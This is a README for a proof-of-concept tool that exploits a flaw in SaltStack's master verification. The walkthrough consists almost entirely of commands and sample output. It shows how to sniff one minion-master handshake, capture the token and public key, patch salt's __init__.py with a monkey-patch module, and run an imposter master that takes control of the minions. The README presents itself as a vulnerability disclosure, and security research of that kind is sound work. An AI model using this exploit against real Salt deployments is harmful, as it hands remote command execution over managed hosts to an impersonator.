## Introduction

This is a tool created to demonstrate a security vulnerability in salt stack's
master verification system. It allows anyone to impersonate a master host
by merely observing one handshake between a minion and a legitimate master.

## Prerequisites

The script that listens for handshake traffic requires pycap and dpkt.
These can be installed like so (on an Ubuntu Precise system):

```sh
sudo apt-get install python-dpkt python-pypcap
```

These instructions are going to assume you already have a working salt-{master,minion}.
If you don't, you can set them up like this (again, Ubuntu Precise):

```sh
sudo apt-get install python-software-properties
sudo add-apt-repository ppa:saltstack/salt
sudo apt-get update
sudo apt-get install salt-master salt-minion
sudo sed -i 's/#master: salt/master: 127.0.0.1/g' /etc/salt/minion
sudo restart salt-minion
sudo salt-key -A
```

Finally, you'll need to clone this repository somewhere.

```sh
git clone https://github.com/dzderic/chicken-salt
```

## The attack

I'm going to be running this attack against a master running on my local machine.
You'll probably want to insert the IP of your master instead of `127.0.0.1`.

The first thing we need to do is listen to a handshake between a minion and a master.
The `listener.py` script does this for us and dumps out the token and public key of
the master we'll be impersonating. You can run it like so:

```sh
sudo ./listener.py --interface lo --address 127.0.0.1
```

Now you'll have to wait for a handshake to occur. If you have control of a minion,
you can force a handshake by restarting the service (`sudo restart salt-minion`).
You should see something like this:

```
Listening for salt packets going to 127.0.0.1 on port 4506
Packet received
Packet received
Packet received
Packet received
Found a token!
Writing token to '/etc/salt/pki/token'
Writing master pub key to '/etc/salt/pki/fake_master.pub'
```

The only thing left to do is impersonate the master. `salt_master_monkey.py` takes
care of serving the token we sniffed earlier and the previous master's public key.
On the imposter master:

```sh
sudo ln -s "`pwd`/salt_master_monkey.py" /usr/lib/pymodules/python2.7/salt/
sudo sh -c 'echo import salt_master_monkey >> /usr/lib/pymodules/python2.7/salt/__init__.py'
```

You'll also want to make sure that the token and public key are in `/etc/salt/pki/`
(which is where they're placed by `listener.py`).

NOTE: If you're running this on a test master, you probably want to remove the
master's actual keys, or this wouldn't be much of an attack now would it?

```sh
sudo stop salt-master
sudo rm /etc/salt/pki/master.pem /etc/salt/pki/master.pub
sudo start salt-master
```

Congratulations, you now have control over many minions to do your bidding.

```console
sudo restart salt-minion   # to force a handshake with the new master
sudo salt \* test.ping
# ubuntu: True
```
